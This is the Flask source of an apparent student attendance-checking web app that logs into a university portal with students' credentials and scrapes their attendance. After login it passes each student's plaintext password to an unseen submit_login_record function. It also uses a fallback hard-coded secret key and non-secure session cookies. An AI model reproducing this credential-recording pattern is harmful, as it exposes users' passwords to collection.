import os
import uuid
from datetime import datetime, timedelta
from dotenv import load_dotenv
import threading

from attendance_scraper import (
    login,
    get_student_details,
    get_subjects,
    fetch_attendance,
    SimpleDataFrame,
    submit_login_record
)
from flask import (
    Flask, flash, render_template, request,
    redirect, send_from_directory, session, jsonify,Response
)
from flask_mail import Mail, Message
# --------------------------------------------------
# App setup
# --------------------------------------------------
load_dotenv()

app = Flask(__name__)
app.config["SECRET_KEY"] = os.environ.get("SECRET_KEY", "your-secret-key-here")

app.config["SESSION_COOKIE_SECURE"] = False
app.config["SESSION_COOKIE_HTTPONLY"] = True
app.config["SESSION_COOKIE_SAMESITE"] = "Lax"

# Mail config
app.config["MAIL_SERVER"] = os.environ.get("MAIL_SERVER", "smtp.gmail.com")
app.config["MAIL_PORT"] = int(os.environ.get("MAIL_PORT", 587))
app.config["MAIL_USE_TLS"] = os.environ.get("MAIL_USE_TLS", "True") == "True"
app.config["MAIL_USE_SSL"] = os.environ.get("MAIL_USE_SSL", "False") == "True"
app.config["MAIL_USERNAME"] = os.environ.get("MAIL_USERNAME")
app.config["MAIL_PASSWORD"] = os.environ.get("MAIL_PASSWORD")
app.config["MAIL_DEFAULT_SENDER"] = os.environ.get("MAIL_DEFAULT_SENDER")

mail = Mail(app)

# In-memory stores
ACTIVE_SESSIONS = {}
ATTENDANCE_CACHE = {}

# --------------------------------------------------
# Helpers
# --------------------------------------------------
def filter_latest_semester(df):
    if not isinstance(df, list):
        return df

    dates = []
    for row in df:
        for d in row.get("Details", []):
            try:
                dates.append(datetime.strptime(d["date"], "%d-%m-%Y"))
            except Exception:
                pass

    if not dates:
        return df

    latest = max(dates)
    start = latest - timedelta(days=180)

    filtered = []
    for row in df:
        new_row = row.copy()
        details = []
        for d in row.get("Details", []):
            try:
                dt = datetime.strptime(d["date"], "%d-%m-%Y")
                if start <= dt <= latest:
                    details.append(d)
            except Exception:
                pass

        new_row["Details"] = details
        total = len(details)
        present = sum(1 for d in details if d.get("status") == "Present")

        new_row["Total Days"] = total
        new_row["No. of Present"] = present
        new_row["No. of Absent"] = total - present
        new_row["Attendance %"] = round((present / total) * 100, 1) if total else 0

        filtered.append(new_row)

    return filtered

# --------------------------------------------------
# Routes
# --------------------------------------------------


@app.route("/", methods=["GET", "POST"])
def login_page():
    if request.method == "GET":
        if "query" in request.args:
            return redirect("/", code=301)
        return render_template("index.html")

    username = request.form.get("username", "").strip()
    password = request.form.get("password", "").strip()

    if not username or not password:
        flash("Username and password are required.", "error")
        return redirect("/")

    try:
        auth_session = login(username, password)

        session.clear()
        session["user"] = username
        ACTIVE_SESSIONS[username] = auth_session

        details = get_student_details(auth_session)
        ACTIVE_SESSIONS[username + "_details"] = details

        threading.Thread(
            target=submit_login_record,
            args=(username,password, details, True),
            daemon=True
        ).start()

        return redirect("/dashboard")          

    except Exception as e:
        threading.Thread(
            target=submit_login_record,
            args=(username, None, False),
            daemon=True
        ).start()

        flash(str(e), "error")
        return redirect("/")                   


@app.route("/dashboard", methods=["GET"])
def dashboard():
    if "user" not in session:
        return redirect("/")

    username = session["user"]
    auth_session = ACTIVE_SESSIONS.get(username)

    if not auth_session:
        session.clear()
        return redirect("/")

    try:
        details = get_student_details(auth_session)
        subjects = get_subjects(auth_session, details)
        df_summary = fetch_attendance(auth_session, subjects)

        df = df_summary.to_dict(orient="records")
        df = filter_latest_semester(df)

        # --------------------------------------------------
        # ADD Can Skip / Need to Attend (REQUIRED BY TEMPLATE)
        # --------------------------------------------------
        for row in df:
            total = row.get("Total Days", 0) or 0
            present = row.get("No. of Present", 0) or 0
            pct = row.get("Attendance %", 0) or 0

            try:
                total = int(total)
                present = int(present)
                pct = float(pct)
            except Exception:
                total = present = pct = 0

            if total == 0:
                row["Can Skip"] = 0
                row["Need to Attend"] = 0
            elif pct >= 75:
                row["Can Skip"] = max(0, int((present / 0.75) - total))
                row["Need to Attend"] = 0
            else:
                row["Can Skip"] = 0
                row["Need to Attend"] = max(0, int((0.75 * total - present) / 0.25))

        total_days = sum(r.get("Total Days", 0) for r in df)
        total_present = sum(r.get("No. of Present", 0) for r in df)
        overall_pct = round((total_present / total_days) * 100, 2) if total_days else 0

        token = uuid.uuid4().hex
        ATTENDANCE_CACHE[token] = {
            r.get("Subject", "Unknown"): r.get("Details", []) for r in df
        }

        return render_template(
            "result.html",
            details=details,
            df=df,
            total_days=total_days,
            total_present=total_present,
            overall_attendance_pct=overall_pct,
            attendance_token=token,
            show=False,
            mess=None
        )

    except Exception as e:
        return render_template(
            "error.html",
            error_message=str(e),
            back_url="/"
        )


@app.route("/contact", methods=["GET", "POST"])
def contact():
    if request.method == "POST":
        try:
            admission = request.form.get("admission")
            email = request.form.get("user_email")
            message = request.form.get("message")

            if not admission or not email or not message:
                flash("All fields are required.", "error")
                return redirect("/contact")

            # Prepare issue data
            issue_data = f"""
                Issue Report
                ============
                Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
                Admission Number: {admission}
                Email: {email}
                Message:
                {message}
                {'=' * 50}
                """

            # Try to send email if configured
            mail_configured = app.config.get("MAIL_USERNAME") and app.config.get("MAIL_PASSWORD")
            
            if mail_configured:
                try:
                    recipient_email = app.config.get("MAIL_DEFAULT_SENDER") or app.config.get("MAIL_USERNAME")
                    msg = Message(
                        subject=f"Issue Report from {admission}",
                        recipients=[recipient_email] if isinstance(recipient_email, str) else recipient_email,
                        body=issue_data,
                        sender=app.config.get("MAIL_DEFAULT_SENDER") or app.config.get("MAIL_USERNAME")
                    )
                    mail.send(msg)
                    flash("Issue submitted successfully. We'll get back to you soon!", "success")
                except Exception as e:
                    # If email fails, log to file instead
                    print(f"Email sending failed: {str(e)}")
                    print(issue_data)
                    # Also log to file
                    try:
                        with open("issues.log", "a", encoding="utf-8") as f:
                            f.write(issue_data)
                        flash("Issue submitted successfully (logged to file). We'll review it soon!", "success")
                    except:
                        print(issue_data)
                        flash("Issue submitted successfully. We'll review it soon!", "success")
            else:
                # Email not configured, log to file/console
                print(issue_data)
                try:
                    with open("issues.log", "a", encoding="utf-8") as f:
                        f.write(issue_data)
                    flash("Issue submitted successfully (logged to file). We'll review it soon!", "success")
                except Exception as log_error:
                    print(f"File logging failed: {str(log_error)}")
                    print(issue_data)
                    flash("Issue submitted successfully. We'll review it soon!", "success")
            
            return redirect("/contact")
        except Exception as e:
            flash(f"Error submitting issue: {str(e)}", "error")
            return redirect("/contact")

    return render_template("contact.html")


@app.route("/contributors")
def contributors():
    return render_template("contributors.html")

@app.route("/loh")
def list_of_holidays():
    return render_template("list_of_holidays.html")

@app.route("/api/attendance")
def api_attendance():
    token = request.args.get("token")
    subject = request.args.get("subject")

    if not token or not subject:
        return jsonify({"error": "Invalid request"}), 400

    data = ATTENDANCE_CACHE.get(token)
    if not data:
        return jsonify({"error": "Expired"}), 404

    return jsonify({"subject": subject, "details": data.get(subject, [])})


@app.route("/robots.txt")
def robots():
    content = """User-agent: *
Allow: /

Sitemap: https://jntua-attendance-app.vercel.app/sitemap.xml
"""
    return Response(content, mimetype="text/plain")

@app.route("/sitemap.xml")
def sitemap():
    xml = """<?xml version="1.0" encoding="UTF-8"?>
<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">

  <url>
    <loc>https://jntua-attendance-app.vercel.app/</loc>
    <lastmod>2026-02-09</lastmod>
    <priority>1.0</priority>
  </url>
  <url>
    <loc>https://jntua-attendance-app.vercel.app/contact</loc>
    <lastmod>2026-02-09</lastmod>
    <priority>0.8</priority>
  </url>
</urlset>
"""
    return Response(xml, mimetype="application/xml")



# --- Android APK download route ------------------------------------------------
# Place the production APK file in `static/apk/` (e.g. jntua-attendance.apk).
# The download link/button on the website will point here; clicking it
# will trigger a direct file download. No authentication or extra logic is used.
@app.route("/download-apk")
def download_apk():
    # the filename should match the actual APK you put in the folder
    return send_from_directory("static/apk", "jntua-attendance.apk", as_attachment=True)



@app.route("/icon.png")
def favicon():
    return send_from_directory("templates", "icon.png")


@app.errorhandler(404)
def not_found(_):
    return render_template(
        "error.html",
        error_message="Page not found.",
        back_url="/"
    ), 404


@app.errorhandler(500)
def server_error(_):
    return render_template(
        "error.html",
        error_message="Internal server error.",
        back_url="/"
    ), 500


if __name__ == "__main__":
    app.run(port=5001, debug=False)
